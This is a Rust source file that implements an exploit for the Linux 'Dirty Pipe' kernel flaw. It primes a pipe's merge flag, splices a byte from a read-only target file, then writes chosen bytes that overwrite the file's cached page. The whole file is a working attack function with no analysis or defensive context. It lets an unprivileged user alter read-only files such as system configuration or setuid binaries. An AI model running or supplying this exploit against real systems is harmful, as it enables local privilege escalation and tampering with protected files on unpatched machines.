use libc::{splice, open, O_RDONLY, loff_t};
use std::io::{pipe, Read, Write};
use std::os::fd::AsRawFd;
use anyhow::{Result, anyhow};
use std::fs;
use std::ffi::CString;
use std::ptr::null_mut;
use std::path::PathBuf;

pub const PIPE_SIZE: usize = 65536;


pub fn exploit(input: PathBuf, output: PathBuf, offset: i64) -> Result<(), anyhow::Error> {
    // Read input file.
    let mut input_buf: Vec<u8> = fs::read(&input)?;

     if offset == 0 {
        println!("Warning: Offset set to 0. This exploit cannot overwrite the first byte of the target. Skipping the first byte.");
        input_buf = Vec::from(&input_buf[1..]);
    }

    // Create pipe
    let (mut dirty_pipe_rx, mut dirty_pipe_tx) = pipe()?;
    println!("Created pipe.");

    // Fill with some data to set the PIPE_FLAG_CAN_MERGE flag
    let mut data: Vec<u8> = vec![0u8; PIPE_SIZE];
    dirty_pipe_tx.write_all(&data);
    println!("Filled pipe.");

    // Drain pipe
    let bytes_read = dirty_pipe_rx.read(&mut data)?;
    println!("Drained (read) {} bytes", bytes_read);

    // Read the target file to enter it into page cache
    fs::read(&output)?;

    // Splice data from target file into the pipe
    println!("Splicing...");
    unsafe {
        // Open file read only
        let file_path = CString::new(output.to_str().unwrap())?;
        let fd = open(file_path.as_ptr(), O_RDONLY);
        println!("FD: {}", fd);

        // Splice
        let mut offset: loff_t = offset; // Needs to be page aligned
        let num_bytes = splice(fd, &mut offset, dirty_pipe_tx.as_raw_fd(), null_mut(), 1, 0);
        println!("Bytes spliced: {}", num_bytes);
    }

    // Write arbitrary data into the pipe.
    // This overwrites the cached file page instead of
    // creating a new one (due to merge flag).
    dirty_pipe_tx.write_all(&input_buf)?;
    drop(dirty_pipe_tx);
    let mut buf = String::new();
    //dirty_pipe_rx.read_to_string(&mut buf)?;

    Ok(())
}